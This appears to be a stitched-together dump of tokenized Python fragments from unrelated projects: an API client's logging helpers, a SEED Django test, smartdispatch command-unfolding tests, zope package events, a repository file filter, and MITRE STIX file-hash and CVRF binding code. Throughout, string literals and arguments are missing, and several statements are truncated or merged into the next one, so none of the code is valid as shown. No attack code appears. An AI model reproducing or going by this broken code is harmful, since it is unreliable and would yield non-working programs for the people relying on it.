~~~ msg = pprint . pformat ( resultOut . json ( ) [ ] , indent = 2 ~~ elif PIIDflag == : \n 
~~~ msg = "Duplicates: " + str ( resultOut . json ( ) [ ] ) + ", Unmatched: " ~~ else : \n 
~~~ msg = pprint . pformat ( resultOut . json ( ) , indent = 2 , width = 70 ) \n 
~~ ~~ ~~ except : \n 
~~~ log . error ( partmsg , ) \n 
log . debug ( ) \n 
raise RuntimeError \n 
\n 
~~ ~~ log . info ( partmsg + ) \n 
log . debug ( msg ) \n 
~~ else : \n 
~~~ msg = resultOut . reason \n 
log . error ( partmsg + ) \n 
log . debug ( msg ) \n 
raise RuntimeError \n 
\n 
~~ return \n 
\n 
\n 
~~ def check_progress ( mainURL , Header , progress_key ) : \n 
~~~ """Delays the sequence until progress is at 100 percent.""" \n 
time . sleep ( 5 ) \n 
progressResult = requests . get ( mainURL + , \n 
headers = Header , \n 
data = json . dumps ( { : progress_key } ) ) \n 
\n 
if progressResult . json ( ) [ ] == 100 : \n 
~~~ return ( progressResult ) \n 
~~ else : \n 
~~~ progressResult = check_progress ( mainURL , Header , progress_key ) \n 
\n 
\n 
~~ ~~ def read_map_file ( mapfilePath ) : \n 
~~~ """Read in the mapping file""" \n 
\n 
assert ( os . path . isfile ( mapfilePath ) ) , "Cannot find file:\\t" + mapfilePath \n 
\n 
mapReader = csv . reader ( open ( mapfilePath , ) ) \n 
mapReader . next ( ) # Skip the header \n 
\n 
# Open the mapping file and fill list \n 
maplist = list ( ) \n 
\n 
for rowitem in mapReader : \n 
~~~ maplist . append ( rowitem ) \n 
\n 
~~ return maplist \n 
\n 
\n 
~~ def setup_logger ( filename ) : \n 
~~~ """Set-up the logger object""" \n 
\n 
logging . getLogger ( "requests" ) . setLevel ( logging . WARNING ) \n 
\n 
logger = logging . getLogger ( ) \n 
logger . setLevel ( logging . DEBUG ) \n 
\n 
formatter = logging . Formatter ( ) \n 
formatter_console = logging . Formatter ( ) \n 
\n 
fh = logging . FileHandler ( filename , mode = ) \n 
fh . setLevel ( logging . DEBUG ) \n 
fh . setFormatter ( formatter ) \n 
logger . addHandler ( fh ) \n 
\n 
ch = logging . StreamHandler ( ) \n 
ch . setLevel ( logging . INFO ) \n 
ch . setFormatter ( formatter_console ) \n 
logger . addHandler ( ch ) \n 
\n 
return logger \n 
# !/usr/bin/env python \n 
# encoding: utf-8 \n 
~~ """\n:copyright (c) 2014 - 2016, The Regents of the University of California, through Lawrence Berkeley National Laboratory (subject to receipt of any required approvals from the U.S. Department of Energy) and contributors. All rights reserved.  # NOQA\n:author\n""" \n 
from django . test import TestCase \n 
from seed . utils . generic import split_model_fields \n 
\n 
\n 
class DummyClass ( object ) : \n 
~~~ "A simple class that has two fields" \n 
field_one = "field_one" \n 
field_two = "field_two" \n 
\n 
\n 
~~ class TestGenericUtils ( TestCase ) : \n 
\n 
~~~ def test_split_model_fields ( self ) : \n 
~~~ """\n        Tests splitting a list of field names based on what fields an\n        object has.\n        """ \n 
f1 = \n 
f2 = \n 
f3 = \n 
f4 = \n 
\n 
obj = DummyClass ( ) \n 
\n 
fields_to_split = [ f1 , f2 , f3 , f4 ] \n 
obj_fields , non_obj_fields = split_model_fields ( obj , fields_to_split ) \n 
self . assertEqual ( obj_fields , [ f1 , f2 ] ) \n 
self . assertEqual ( non_obj_fields , [ f3 , f4 ] ) \n 
\n 
fields_to_split = [ f1 ] \n 
obj_fields , non_obj_fields = split_model_fields ( obj , fields_to_split ) \n 
self . assertEqual ( obj_fields , [ f1 ] ) \n 
self . assertEqual ( non_obj_fields , [ ] ) \n 
\n 
fields_to_split = [ f4 ] \n 
obj_fields , non_obj_fields = split_model_fields ( obj , fields_to_split ) \n 
self . assertEqual ( obj_fields , [ ] ) \n 
self . assertEqual ( non_obj_fields , [ f4 ] ) \n 
~~ ~~ from setuptools import setup , find_packages \n 
\n 
setup ( \n 
name = , \n 
version = , \n 
packages = find_packages ( ) , \n 
url = , \n 
license = , \n 
author = , \n 
author_email = , \n 
description = scripts = [ ] \n 
) \n 
import os \n 
import re \n 
import shutil \n 
import time as t \n 
from os . path import join as pjoin \n 
from StringIO import StringIO \n 
\n 
import tempfile \n 
from nose . tools import assert_true , assert_equal \n 
from numpy . testing import assert_array_equal \n 
\n 
import smartdispatch \n 
from smartdispatch import utils \n 
\n 
\n 
def test_generate_name_from_command ( ) : \n 
~~~ date_length = 20 \n 
\n 
command = "command arg1 arg2" \n 
expected = "_" . join ( command . split ( ) ) \n 
assert_equal ( smartdispatch . generate_name_from_command ( command ) [ date_length : ] , expected ) \n 
\n 
max_length_arg = 7 \n 
long_arg = "veryverylongarg1" \n 
command = "command " + long_arg + " arg2" \n 
expected = command . split ( ) \n 
expected [ 1 ] = long_arg [ - max_length_arg : ] \n 
expected = "_" . join ( expected ) \n 
assert_equal ( smartdispatch . generate_name_from_command ( command , max_length_arg ) [ date_length : ] , expected \n 
max_length = 23 \n 
command = "command veryverylongarg1 veryverylongarg1 veryverylongarg1 veryverylongarg1" \n 
expected = command [ : max_length ] . replace ( " " , "_" ) \n 
assert_equal ( smartdispatch . generate_name_from_command ( command , max_length = max_length + date_length \n 
# Test path arguments in command \n 
command = "command path/number/one path/number/two" \n 
expected = "command_pathnumberone_pathnumbertwo" \n 
assert_equal ( smartdispatch . generate_name_from_command ( command ) [ date_length : ] , expected ) \n 
\n 
\n 
~~ def test_get_commands_from_file ( ) : \n 
~~~ commands = [ "command1 arg1 arg2" , \n 
"command2" , \n 
"command3 arg1 arg2 arg3 arg4" ] \n 
fileobj = StringIO ( "\\n" . join ( commands ) ) \n 
assert_array_equal ( smartdispatch . get_commands_from_file ( fileobj ) , commands ) \n 
\n 
# Test stripping last line if empty \n 
fileobj = StringIO ( "\\n" . join ( commands ) + "\\n" ) \n 
assert_array_equal ( smartdispatch . get_commands_from_file ( fileobj ) , commands ) \n 
\n 
\n 
~~ def test_unfold_command ( ) : \n 
# Test with one argument \n 
~~~ cmd = "ls" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "ls" ] ) \n 
\n 
cmd = "echo 1" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "echo 1" ] ) \n 
\n 
# Test two arguments \n 
cmd = "echo [1 2]" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "echo 1" , "echo 2" ] ) \n 
\n 
cmd = "echo test [1 2] yay" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "echo test 1 yay" , "echo test 2 yay" ] ) \n 
\n 
cmd = "echo test[1 2]" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "echo test1" , "echo test2" ] ) \n 
\n 
cmd = "echo test[1 2]yay" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "echo test1yay" , "echo test2yay" ] ) \n 
\n 
# Test multiple folded arguments \n 
cmd = "python my_command.py [0.01 0.000001 0.00000000001] -1 [omicron mu]" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "python my_command.py 0.01 -1 omicron" , \n 
"python my_command.py 0.01 -1 mu" , \n 
"python my_command.py 0.000001 -1 omicron" , \n 
"python my_command.py 0.000001 -1 mu" , \n 
"python my_command.py 0.00000000001 -1 omicron" "python my_command.py 0.00000000001 -1 mu" ] ) \n 
\n 
# Test multiple folded arguments and not unfoldable brackets \n 
cmd = "python my_command.py [0.01 0.000001 0.00000000001] -1 \\[[42 133,666]\\] slow [omicron mu]" assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "python my_command.py 0.01 -1 [42] slow omicron" "python my_command.py 0.01 -1 [42] slow mu" , \n 
"python my_command.py 0.01 -1 [133,666] slow omicron" "python my_command.py 0.01 -1 [133,666] slow mu" "python my_command.py 0.000001 -1 [42] slow omicron" "python my_command.py 0.000001 -1 [42] slow mu" "python my_command.py 0.000001 -1 [133,666] slow omicron" "python my_command.py 0.000001 -1 [133,666] slow mu" "python my_command.py 0.00000000001 -1 [42] slow omicron" "python my_command.py 0.00000000001 -1 [42] slow mu" "python my_command.py 0.00000000001 -1 [133,666] slow omicron" "python my_command.py 0.00000000001 -1 [133,666] slow mu" \n 
# Test multiple different folded arguments \n 
cmd = "python my_command.py [0.01 0.001] -[1:5] slow" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "python my_command.py 0.01 -1 slow" , \n 
"python my_command.py 0.01 -2 slow" , \n 
"python my_command.py 0.01 -3 slow" , \n 
"python my_command.py 0.01 -4 slow" , \n 
"python my_command.py 0.001 -1 slow" , \n 
"python my_command.py 0.001 -2 slow" , \n 
"python my_command.py 0.001 -3 slow" , \n 
"python my_command.py 0.001 -4 slow" ] ) \n 
\n 
cmd = "python my_command.py -[1:5] slow [0.01 0.001]" \n 
assert_equal ( smartdispatch . unfold_command ( cmd ) , [ "python my_command.py -1 slow 0.01" , \n 
"python my_command.py -1 slow 0.001" , \n 
"python my_command.py -2 slow 0.01" , \n 
"python my_command.py -2 slow 0.001" , \n 
"python my_command.py -3 slow 0.01" , \n 
"python my_command.py -3 slow 0.001" , \n 
"python my_command.py -4 slow 0.01" , \n 
"python my_command.py -4 slow 0.001" ] ) \n 
\n 
\n 
~~ def test_replace_uid_tag ( ) : \n 
~~~ command = "command without uid tag" \n 
assert_array_equal ( smartdispatch . replace_uid_tag ( [ command ] ) , [ command ] ) \n 
\n 
command = "command with one {UID} tag" \n 
uid = utils . generate_uid_from_string ( command ) \n 
assert_array_equal ( smartdispatch . replace_uid_tag ( [ command ] ) , [ command . replace ( "{UID}" , uid ) ] ) \n 
\n 
command = "command with two {UID} tag {UID}" \n 
uid = utils . generate_uid_from_string ( command ) \n 
assert_array_equal ( smartdispatch . replace_uid_tag ( [ command ] ) , [ command . replace ( "{UID}" , uid ) ] ) \n 
\n 
commands = [ "a command with a {UID} tag" ] * 10 \n 
uid = utils . generate_uid_from_string ( commands [ 0 ] ) \n 
assert_array_equal ( smartdispatch . replace_uid_tag ( commands ) , [ commands [ 0 ] . replace ( "{UID}" , uid ) ] \n 
\n 
~~ def test_get_available_queues ( ) : \n 
~~~ assert_equal ( smartdispatch . get_available_queues ( cluster_name = None ) , { } ) \n 
assert_equal ( smartdispatch . get_available_queues ( cluster_name = "unknown" ) , { } ) \n 
\n 
queues_infos = smartdispatch . get_available_queues ( cluster_name = "guillimin" ) \n 
assert_true ( len ( queues_infos ) > 0 ) \n 
\n 
queues_infos = smartdispatch . get_available_queues ( cluster_name = "mammouth" ) \n 
assert_true ( len ( queues_infos ) > 0 ) \n 
\n 
\n 
~~ def test_get_job_folders ( ) : \n 
~~~ temp_dir = tempfile . mkdtemp ( ) \n 
jobname = "this_is_the_name_of_my_job" \n 
job_folders_paths = smartdispatch . get_job_folders ( temp_dir , jobname ) \n 
path_job , path_job_logs , path_job_commands = job_folders_paths \n 
\n 
assert_true ( jobname in path_job ) \n 
assert_true ( os . path . isdir ( path_job ) ) \n 
assert_equal ( os . path . basename ( path_job ) , jobname ) \n 
\n 
assert_true ( jobname in path_job_logs ) \n 
assert_true ( os . path . isdir ( path_job_logs ) ) \n 
assert_true ( os . path . isdir ( pjoin ( path_job_logs , ) ) ) \n 
assert_true ( os . path . isdir ( pjoin ( path_job_logs , ) ) ) \n 
assert_true ( os . path . isdir ( path_job_logs ) ) \n 
assert_equal ( os . path . basename ( path_job_logs ) , "logs" ) \n 
\n 
assert_true ( jobname in path_job_commands ) \n 
assert_true ( os . path . isdir ( path_job_commands ) ) \n 
assert_equal ( os . path . basename ( path_job_commands ) , "commands" ) \n 
\n 
# In theory the following should not create new folders. \n 
# Insteead it will return the paths to existing folders. \n 
jobname += "2" \n 
os . rename ( path_job , path_job + "2" ) \n 
job_folders_paths = smartdispatch . get_job_folders ( temp_dir , jobname ) \n 
path_job , path_job_logs , path_job_commands = job_folders_paths \n 
\n 
assert_true ( jobname in path_job ) \n 
assert_true ( os . path . isdir ( path_job ) ) \n 
assert_equal ( os . path . basename ( path_job ) , jobname ) \n 
\n 
assert_true ( jobname in path_job_logs ) \n 
assert_true ( os . path . isdir ( path_job_logs ) ) \n 
assert_true ( os . path . isdir ( pjoin ( path_job_logs , ) ) ) \n 
assert_true ( os . path . isdir ( pjoin ( path_job_logs , ) ) ) \n 
assert_true ( os . path . isdir ( path_job_logs ) ) \n 
assert_equal ( os . path . basename ( path_job_logs ) , "logs" ) \n 
\n 
assert_true ( jobname in path_job_commands ) \n 
assert_true ( os . path . isdir ( path_job_commands ) ) \n 
assert_equal ( os . path . basename ( path_job_commands ) , "commands" ) \n 
\n 
shutil . rmtree ( temp_dir ) \n 
\n 
\n 
~~ def test_log_command_line ( ) : \n 
~~~ temp_dir = tempfile . mkdtemp ( ) \n 
command_line_log_file = pjoin ( temp_dir , "command_line.log" ) \n 
\n 
command_1 = "echo 1 2 3" \n 
smartdispatch . log_command_line ( temp_dir , command_1 ) \n 
assert_true ( os . path . isfile ( command_line_log_file ) ) \n 
\n 
lines = open ( command_line_log_file ) . read ( ) . strip ( ) . split ( "\\n" ) \n 
assert_equal ( len ( lines ) , 2 ) # Datetime, the command line. \n 
assert_true ( t . strftime ( "## %Y-%m-%d %H:%M:" ) in lines [ 0 ] ) \n 
assert_equal ( lines [ 1 ] , command_1 ) \n 
\n 
command_2 = "echo \\"bob\\"" # With quotes. \n 
smartdispatch . log_command_line ( temp_dir , command_2 ) \n 
assert_true ( os . path . isfile ( command_line_log_file ) ) \n 
\n 
lines = open ( command_line_log_file ) . read ( ) . strip ( ) . split ( "\\n" ) \n 
assert_equal ( len ( lines ) , 5 ) \n 
assert_true ( t . strftime ( "## %Y-%m-%d %H:%M:" ) in lines [ 3 ] ) \n 
assert_equal ( lines [ 4 ] , command_2 . replace ( \'"\' , r\'\\"\' ) ) \n 
\n 
command_3 = "echo [asd]" # With square brackets. \n 
smartdispatch . log_command_line ( temp_dir , command_3 ) \n 
assert_true ( os . path . isfile ( command_line_log_file ) ) \n 
\n 
lines = open ( command_line_log_file ) . read ( ) . strip ( ) . split ( "\\n" ) \n 
assert_equal ( len ( lines ) , 8 ) \n 
assert_true ( t . strftime ( "## %Y-%m-%d %H:%M:" ) in lines [ 6 ] ) \n 
assert_equal ( lines [ 7 ] , re . sub ( , r\'"\\1\\2\\3"\' , command_3 ) ) \n 
\n 
shutil . rmtree ( temp_dir ) \n 
~~ from . sgd import SGD \n 
from . adagrad import AdaGrad \n 
from . adam import Adam \n 
from . rmsprop import RMSProp \n 
from . adadelta import Adadelta \n 
from zope . interface import Attribute \n 
from zope . interface import Interface \n 
from zope . interface import implements \n 
\n 
class IIndexEvent ( Interface ) : \n 
~~~ """\n    An lower level event involving the index\n    """ \n 
\n 
~~ class IIndexUpdate ( Interface ) : \n 
~~~ """\n    An low level event involving the index\n    """ \n 
\n 
~~ class IPackageEvent ( IIndexEvent ) : \n 
~~~ """\n    An event involving a package\n    """ \n 
path = Attribute ( ) \n 
\n 
\n 
~~ class IPackageAdded ( IPackageEvent ) : \n 
~~~ """\n    A package is added to the repository\n    """ \n 
\n 
\n 
~~ class IPackageRemoved ( IPackageEvent ) : \n 
~~~ """\n    A package is removed to the repository\n    """ \n 
\n 
\n 
~~ class IndexEvent ( object ) : \n 
~~~ implements ( IIndexEvent ) \n 
def __init__ ( self , datafile , index ) : \n 
~~~ self . index = index \n 
self . datafile = datafile \n 
\n 
\n 
~~ ~~ class IndexUpdate ( IndexEvent ) : \n 
~~~ implements ( IIndexUpdate ) \n 
\n 
\n 
~~ class PackageEvent ( object ) : \n 
~~~ """\n    Baseclass for pacakage events\n    """ \n 
implements ( IPackageEvent ) \n 
\n 
def __init__ ( self , index_manager , path = None , name = None , version = None ) : \n 
~~~ self . name = name \n 
self . version = version \n 
self . im = index_manager \n 
self . path = path \n 
\n 
if self . name is None and self . path : \n 
~~~ info = self . im . pkginfo_from_file ( path , self . im . move_on_error ) \n 
self . name = info . name \n 
self . version = info . version \n 
\n 
##     def redispatch(self): \n 
##         self.obj.registry.notify(self, self.obj) \n 
\n 
##     @staticmethod \n 
##     def channel_dispatch(event): \n 
##         """ \n 
##         Resdispatches any object event with the original event and the \n 
##         object contained \n 
##         """ \n 
##         event.redispatch() \n 
\n 
\n 
~~ ~~ ~~ class PackageAdded ( PackageEvent ) : \n 
~~~ implements ( IPackageAdded ) \n 
\n 
\n 
~~ class PackageRemoved ( PackageEvent ) : \n 
~~~ implements ( IPackageRemoved ) \n 
\n 
\n 
~~ __author__ = \n 
\n 
import simplejson as json \n 
import codecs \n 
from datetime import datetime \n 
\n 
\n 
class Filter ( ) : \n 
\n 
\n 
~~~ FILTERED_RESOURCES = { } \n 
\n 
FILTERED_EXTENSIONS = [ ] \n 
\n 
def __init__ ( self , json_repo_path , json_filtered_repo_path , filtered_resources_path , filtered_extensions_path ~~~ self . JSON_REPO_PATH = json_repo_path \n 
self . JSON_REPO_FILTERED_PATH = json_filtered_repo_path \n 
self . FILTERED_RESOURCES_PATH = filtered_resources_path \n 
self . FILTERED_EXTENSIONS_PATH = filtered_extensions_path \n 
self . type = type \n 
self . logger = logger \n 
\n 
~~ def get_filtered_files_to_dict ( self ) : \n 
~~~ filtered_file = codecs . open ( self . FILTERED_RESOURCES_PATH , , ) \n 
for line in filtered_file : \n 
~~~ splitted_line = line . split ( ) \n 
ref = splitted_line [ 0 ] . strip ( ) \n 
dir = splitted_line [ 1 ] . strip ( ) \n 
file = splitted_line [ 2 ] . strip ( ) \n 
\n 
if Filter . FILTERED_RESOURCES . get ( ref ) : \n 
~~~ dir2file_dict = Filter . FILTERED_RESOURCES . get ( ref ) \n 
if dir == "*" : \n 
~~~ dir2file_dict . update ( { : } ) \n 
Filter . FILTERED_RESOURCES . update ( { ref : dir2file_dict } ) \n 
~~ elif dir2file_dict . get ( dir ) : \n 
~~~ files = dir2file_dict . get ( dir ) \n 
if file == "*" : \n 
~~~ dir2file_dict . update ( { dir : [ ] } ) \n 
Filter . FILTERED_RESOURCES . update ( { ref : dir2file_dict } ) \n 
~~ else : \n 
~~~ files . append ( file ) \n 
dir2file_dict . update ( { dir : files } ) \n 
Filter . FILTERED_RESOURCES . update ( { ref : dir2file_dict } ) \n 
~~ ~~ else : \n 
~~~ if file == "*" : \n 
~~~ dir2file_dict . update ( { dir : [ ] } ) \n 
Filter . FILTERED_RESOURCES . update ( { ref : dir2file_dict } ) \n 
~~ else : \n 
~~~ dir2file_dict . update ( { dir : [ file ] } ) \n 
Filter . FILTERED_RESOURCES . update ( { ref : dir2file_dict } ) \n 
~~ ~~ ~~ else : \n 
~~~ if dir == "*" : \n 
~~~ Filter . FILTERED_RESOURCES . update ( { ref : { : } } ) \n 
~~ else : \n 
~~~ if file == "*" : \n 
~~~ Filter . FILTERED_RESOURCES . update ( { ref : { dir : [ ] } } ) \n 
~~ else : \n 
~~~ Filter . FILTERED_RESOURCES . update ( { ref : { dir : [ file ] } } ) \n 
~~ ~~ ~~ ~~ filtered_file . close ( ) \n 
\n 
~~ def get_filtered_extensions_to_list ( self ) : \n 
~~~ file = codecs . open ( self . FILTERED_EXTENSIONS_PATH , , ) \n 
for line in file : \n 
~~~ ext = line . strip ( ) \n 
Filter . FILTERED_EXTENSIONS . append ( ext ) \n 
~~ file . close ( ) \n 
\n 
~~ def is_filtered ( self , ext , ref , dir , file ) : \n 
~~~ found = False \n 
\n 
if ext in Filter . FILTERED_EXTENSIONS : \n 
~~~ found = True \n 
~~ else : \n 
~~~ if Filter . FILTERED_RESOURCES . get ( ref ) : \n 
~~~ filtered_dirs_in_ref = Filter . FILTERED_RESOURCES . get ( ref ) \n 
if filtered_dirs_in_ref . get ( ) : \n 
~~~ found = True \n 
~~ else : \n 
~~~ if filtered_dirs_in_ref . get ( dir ) : \n 
~~~ filtered_files_in_dir = filtered_dirs_in_ref . get ( dir ) \n 
if in filtered_files_in_dir : \n 
~~~ found = True \n 
~~ else : \n 
~~~ if file in filtered_files_in_dir : \n 
~~~ found = True \n 
~~ ~~ ~~ ~~ ~~ ~~ return found \n 
\n 
~~ def get_dirs ( self , dirs ) : \n 
#if the file is in the root directory \n 
~~~ if not dirs : \n 
~~~ dirs . append ( ) \n 
\n 
~~ return dirs \n 
\n 
~~ def select_files ( self ) : \n 
~~~ repo_json = codecs . open ( self . JSON_REPO_PATH , , ) \n 
filtered_repo_json = codecs . open ( self . JSON_REPO_FILTERED_PATH , , ) \n 
#Each JSON data per line \n 
\n 
for json_line in repo_json : \n 
~~~ json_entry = json . loads ( json_line ) \n 
\n 
ref = json_entry . get ( ) \n 
dirs = self . get_dirs ( json_entry . get ( ) ) \n 
ext = json_entry . get ( ) \n 
file = json_entry . get ( ) \n 
\n 
filtered = True \n 
for dir in dirs : \n 
~~~ if self . is_filtered ( ext , ref , dir , file ) : \n 
~~~ filtered = False \n 
break \n 
\n 
~~ ~~ if not filtered : \n 
~~~ filtered_repo_json . write ( json . dumps ( json_entry ) + ) \n 
~~ else : \n 
~~~ self . logger . info ( "Filtering:" + ref + " - " + dirs [ 0 ] + " - " + file + " - " + ext + \n 
~~ ~~ repo_json . close ( ) \n 
filtered_repo_json . close ( ) \n 
\n 
~~ def reject_files ( self ) : \n 
~~~ repo_json = codecs . open ( self . JSON_REPO_PATH , , ) \n 
filtered_repo_json = codecs . open ( self . JSON_REPO_FILTERED_PATH , , ) \n 
#Each JSON data per line \n 
\n 
for json_line in repo_json : \n 
~~~ json_entry = json . loads ( json_line ) \n 
\n 
ref = json_entry . get ( ) \n 
dirs = self . get_dirs ( json_entry . get ( ) ) \n 
ext = json_entry . get ( ) \n 
file = json_entry . get ( ) \n 
\n 
#if a directory that includes the file is filtered, the file will be filtered \n 
filtered = False \n 
for dir in dirs : \n 
~~~ if self . is_filtered ( ext , ref , dir , file ) : \n 
~~~ filtered = True \n 
break \n 
\n 
~~ ~~ if not filtered : \n 
~~~ filtered_repo_json . write ( json . dumps ( json_entry ) + ) \n 
~~ else : \n 
~~~ self . logger . info ( "Filtering:" + ref + " - " + dirs [ 0 ] + " - " + file + " - " + ext + \n 
~~ ~~ repo_json . close ( ) \n 
filtered_repo_json . close ( ) \n 
\n 
~~ def filter ( self ) : \n 
~~~ start_time = datetime . now ( ) \n 
if self . FILTERED_EXTENSIONS_PATH : \n 
~~~ self . get_filtered_extensions_to_list ( ) \n 
~~ if self . FILTERED_RESOURCES_PATH : \n 
~~~ self . get_filtered_files_to_dict ( ) \n 
\n 
~~ if self . type == "in" : \n 
~~~ self . select_files ( ) \n 
~~ elif self . type == "out" : \n 
~~~ self . reject_files ( ) \n 
~~ else : \n 
~~~ self . logger . error ( "Filtering: no action type = " + self . type ) \n 
~~ end_time = datetime . now ( ) \n 
\n 
minutes_and_seconds = divmod ( ( end_time - start_time ) . total_seconds ( ) , 60 ) \n 
self . logger . info ( "Filtering: process finished after " + str ( minutes_and_seconds [ 0 ] ) \n 
+ " minutes and " + str ( round ( minutes_and_seconds [ 1 ] , 1 ) ) + " secs" ) #!/usr/bin/env python # Copyright (c) 2015, The MITRE Corporation. All rights reserved. \n 
# See LICENSE.txt for complete terms. \n 
~~ ~~ """\nDescription: Build a STIX File Hash Observables document. Note that this\ndoes NOT create an Indicator and instead will add the File Hash Observable\nto the top-level Observables collection found in the STIX Package.\n""" \n 
# python-cybox \n 
from cybox . common import Hash \n 
from cybox . objects . file_object import File \n 
\n 
# python-stix \n 
from stix . core import STIXPackage , STIXHeader \n 
\n 
\n 
def main ( ) : \n 
# Create our CybOX Simple Hash Value \n 
~~~ shv = Hash ( ) \n 
shv . simple_hash_value = "4EC0027BEF4D7E1786A04D021FA8A67F" \n 
\n 
# Create a CybOX File Object and add the Hash we created above. \n 
f = File ( ) \n 
h = Hash ( shv , Hash . TYPE_MD5 ) \n 
f . add_hash ( h ) \n 
\n 
# Create the STIX Package \n 
stix_package = STIXPackage ( ) \n 
\n 
# Create the STIX Header and add a description. \n 
stix_header = STIXHeader ( ) \n 
stix_header . description = "Simple File Hash Observable Example" \n 
stix_package . stix_header = stix_header \n 
\n 
# Add the File Hash Observable to the STIX Package. The add() method will \n 
# inspect the input and add it to the top-level stix_package.observables \n 
# collection. \n 
stix_package . add ( f ) \n 
\n 
# Print the XML! \n 
print ( stix_package . to_xml ( ) ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ main ( ) \n 
# Copyright (c) 2015, The MITRE Corporation. All rights reserved. \n 
# See LICENSE.txt for complete terms. \n 
\n 
#!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
\n 
# \n 
# Generated Thu Apr 11 15:07:59 2013 by generateDS.py version 2.9a. \n 
# \n 
\n 
~~ import sys \n 
\n 
from mixbox . binding_utils import * \n 
\n 
from stix . bindings import register_extension \n 
import stix . bindings . exploit_target as exploit_target_binding \n 
\n 
XML_NS = "http://stix.mitre.org/extensions/Vulnerability#CVRF-1" \n 
\n 
# \n 
# Data representation classes. \n 
# \n 
\n 
@ register_extension \n 
class CVRF1_1InstanceType ( exploit_target_binding . VulnerabilityType ) : \n 
~~~ """The CVRF1.1InstanceType provides an extension to the\n    exploit_target_binding.VulnerabilityType which imports and leverages the CVRF schema\n    for structured characterization of Vulnerabilities. This could\n    include characterization of 0-days or other vulnerabilities that\n    do not have a CVE or OSVDB ID.""" \n 
subclass = None \n 
superclass = exploit_target_binding . VulnerabilityType \n 
\n 
xmlns = XML_NS \n 
xmlns_prefix = "cvrfVuln" \n 
xml_type = "CVRF1.1InstanceType" \n 
\n 
def __init__ ( self , Description = None , CVE_ID = None , OSVDB_ID = None , CVSS_Score = None , cvrfdoc = None ) : ~~~ super ( CVRF1_1InstanceType , self ) . __init__ ( Description = Description , CVE_ID = CVE_ID , OSVDB_ID = OSVDB_ID self . cvrfdoc = cvrfdoc \n 
~~ def factory ( * args_ , ** kwargs_ ) : \n 
~~~ if CVRF1_1InstanceType . subclass : \n 
~~~ return CVRF1_1InstanceType . subclass ( * args_ , ** kwargs_ ) \n 
~~ else : \n 
~~~ return CVRF1_1InstanceType ( * args_ , ** kwargs_ ) \n 
~~ ~~ factory = staticmethod ( factory ) \n 
def get_cvrfdoc ( self ) : return self . cvrfdoc \n 
def set_cvrfdoc ( self , cvrfdoc ) : self . cvrfdoc = cvrfdoc \n 
def hasContent_ ( self ) : \n 
~~~ if ( \n 
self . cvrfdoc is not None or \n 
super ( CVRF1_1InstanceType , self ) . hasContent_ ( ) \n 
) : \n 
~~~ return True \n 
~~ else : \n 
~~~ return False \n 
~~ ~~ def export ( self , lwrite , level , nsmap , namespace_ = XML_NS , name_ = , namespacedef_ ~~~ if pretty_print : \n 
~~~ eol_ = \n 
~~ else : \n 
~~~ eol_ = \n 
~~ showIndent ( lwrite , level , pretty_print ) \n 
lwrite ( % ( nsmap [ namespace_ ] , name_ , namespacedef_ and + namespacedef_ or , already_processed = set ( ) \n 
self . exportAttributes ( lwrite , level , already_processed , namespace_ , name_ = if self . hasContent_ ( ) : \n 
~~~ lwrite ( % ( eol_ , ) ) \n 
self . exportChildren ( lwrite , level + 1 , nsmap , XML_NS , name_ , pretty_print = pretty_print ) \n 
showIndent ( lwrite , level , pretty_print ) \n 
lwrite ( % ( nsmap [ namespace_ ] , name_ , eol_ ) ) \n 
~~ else : \n 
~~~ lwrite ( % ( eol_ , ) ) \n 
~~ ~~ def exportAttributes ( self , lwrite , level , already_processed , namespace_ = , name_ = ~~~ super ( CVRF1_1InstanceType , self ) . exportAttributes ( lwrite , level , already_processed , namespace_ if not in already_processed : \n 
~~~ already_processed . add ( ) \n 
xmlns = " xmlns:%s=\'%s\'" % ( self . xmlns_prefix , self . xmlns ) \n 
lwrite ( xmlns ) \n 
~~ if not in already_processed : \n 
~~~ already_processed . add ( ) \n 
xsi_type = " xsi:type=\'%s:%s\'" % ( self . xmlns_prefix , self . xml_type ) \n 
lwrite ( xsi_type ) \n 
~~ ~~ def exportChildren ( self , lwrite , level , nsmap , namespace_ = XML_NS , name_ = , fromsubclass_ ~~~ super ( CVRF1_1InstanceType , self ) . exportChildren ( lwrite , level , nsmap , namespace_ , name_ , True if pretty_print : \n 
~~~ eol_ = \n 
~~ else : \n 
~~~ eol_ = \n 
~~ if self . cvrfdoc is not None : \n 
~~~ showIndent ( lwrite , level , pretty_print ) \n 
lwrite ( etree_ . tostring ( self . cvrfdoc , pretty_print = pretty_print ) ) \n 
~~ ~~ def build ( self , node ) : \n 
~~~ already_processed = set ( ) \n 
self . buildAttributes ( node , node . attrib , already_processed ) \n 
for child in node : \n 
~~~ nodeName_ = Tag_pattern_ . match ( child . tag ) . groups ( ) [ - 1 ] \n 
self . buildChildren ( child , node , nodeName_ ) \n 
~~ ~~ def buildAttributes ( self , node , attrs , already_processed ) : \n 
~~~ super ( CVRF1_1InstanceType , self ) . buildAttributes ( node , attrs , already_processed ) \n 
~~ def buildChildren ( self , child_ , node , nodeName_ , fromsubclass_ = False ) : \n 
~~~ if nodeName_ == : \n 
~~~ self . set_cvrfdoc ( child_ ) \n 
~~ super ( CVRF1_1InstanceType , self ) . buildChildren ( child_ , node , nodeName_ , True ) \n 
# end class CVRF1_1InstanceType \n 
\n 
~~ ~~ GDSClassesMapping = { } \n 
\n 
USAGE_TEXT = """\nUsage: python <Parser>.py [ -s ] <in_xml_file>\n""" \n 
\n 
def usage ( ) : \n 
~~~ print USAGE_TEXT \n 
sys . exit ( 1 ) \n 
\n 
~~ def get_root_tag ( node ) : \n 
~~~ tag = Tag_pattern_ . match ( node . tag ) . groups ( ) [ - 1 ] \n 
rootClass = GDSClassesMapping . get ( tag ) \n 
if rootClass is None : \n 
~~~ rootClass = globals ( ) . get ( tag ) \n 
~~ return tag , rootClass \n 
\n 
~~ def parse ( inFileName ) : \n 
~~~ doc = parsexml_ ( inFileName ) \n 
rootNode = doc . getroot ( ) \n 
